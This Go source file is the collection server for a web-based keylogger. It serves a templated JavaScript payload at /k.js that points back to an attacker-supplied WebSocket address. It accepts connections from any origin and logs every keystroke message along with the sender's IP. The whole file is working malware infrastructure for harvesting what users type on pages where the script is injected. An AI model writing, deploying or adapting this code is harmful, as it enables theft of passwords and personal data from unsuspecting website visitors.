package main

import (
	"flag"
	"fmt"
	"html/template"
	"log"
	"net/http"
  
	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"

  // el codigo cliente dentro de example debe correr en un servidor propio
)


// Setup
var (
	upgrader = websocket.Upgrader{
		CheckOrigin: func(r *http.Request) bool { return true },
	}

	wsAddr     string
	jsTemplate *template.Template
)

const PORT = ":8080"

func init() {
	flag.StringVar(&wsAddr, "ws-addr", "", "Address for WebSocket connection")
	flag.Parse()
	var err error
	jsTemplate, err = template.ParseFiles("logger.js")
	if err != nil {
		panic(err)
	}
}


// Init keylogger
func serveWS(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		http.Error(w, "", 500)
		return
	}
	defer conn.Close()
	fmt.Printf("Connection from %s\n", conn.RemoteAddr().String())
	for {
		_, msg, err := conn.ReadMessage()
		if err != nil {
			return
		}
		fmt.Printf("From %s: %s\n", conn.RemoteAddr().String(), string(msg))
	}
}


// Call the script
func serveFile(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/javascript")
	jsTemplate.Execute(w, wsAddr)
}


func main() {
  if(wsAddr == "") {
   fmt.Println("Usage: wk -ws-addr ip:port")
   return
  }

	r := mux.NewRouter()
	r.HandleFunc("/ws", serveWS)
	r.HandleFunc("/k.js", serveFile)
  log.Fatal(http.ListenAndServe(PORT, r))
}
